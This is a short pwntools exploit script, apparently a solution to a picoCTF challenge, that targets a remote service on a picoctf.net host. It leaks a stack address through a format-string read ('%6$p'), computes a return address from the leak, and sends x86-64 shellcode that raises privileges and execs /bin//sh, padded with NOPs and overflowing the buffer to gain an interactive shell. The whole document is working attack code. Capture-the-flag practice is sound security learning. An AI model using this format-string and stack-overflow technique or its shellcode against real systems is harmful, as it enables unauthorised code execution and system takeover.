from pwn import *

target = remote("wily-courier.picoctf.net", 64369)

# Leak a stack address using FSV
target.sendline(b'%6$p')
leak = int(target.recvline().strip(), 16)

shellcode = b'\x6a\x6c\x58\x0f\x05\x50\x50\x5f\x5e\x6a\x72\x58\x0f\x05\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x4d\x31\xc9\x41\x51\x53\x54\x5f\x6a\x3b\x58\x41\x51\x41\x51\x5e\x5a\x0f\x05'

# Calculate the address of our second input using the leaked address.
# Note: When run on my local machine, the offset is -0x188, but it's -0x158 on remote!
dest = leak - 0x158
payload =  shellcode + b'\x90'*(120-len(shellcode)) + p64(dest)
target.sendline(payload)

# Hopefully we have a shell lol
target.interactive()